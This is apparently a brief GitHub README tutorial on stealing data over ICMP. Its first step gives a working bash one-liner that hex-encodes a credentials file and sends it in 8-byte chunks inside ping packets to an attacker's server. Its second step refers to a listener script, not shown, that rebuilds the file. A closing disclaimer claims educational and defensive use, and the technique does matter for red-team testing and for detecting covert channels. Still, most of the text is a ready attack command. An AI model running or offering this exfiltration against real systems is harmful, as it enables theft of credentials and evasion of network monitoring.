# Data Exfiltration via ICMP

-Step 1 )> Run the following command on the client server from linux command line:
```bash
xxd -p -c 8 creds.txt | while read h; do ping -c 1 -p $h <Server-IP>; done
```

<img width="1409" height="552" alt="icmp_1" src="https://github.com/user-attachments/assets/fdbe63ae-18b0-450f-8bd2-ee8d4d881f8e" />

  - Here, we are reading the target file in fixed-size chunks and sent each chunk to our server (8 bytes) by embedding it into ICMP packets, effectively exfiltrating the data bit by bit.


Step 2 )> Run the ```icmp.py``` script on your server to capture incoming ICMP packets and extract the embedded data, and then reassemble the original file to reconstruct it fully.

<img width="1333" height="329" alt="icmp_2" src="https://github.com/user-attachments/assets/43263079-232e-4410-a0ac-a949d2a6b28f" />

Disclaimer: This is for educational and defensive use only. Do not perform unauthorized testing, exploitation, or data exfiltration against systems you do not own or have explicit written permission to test.
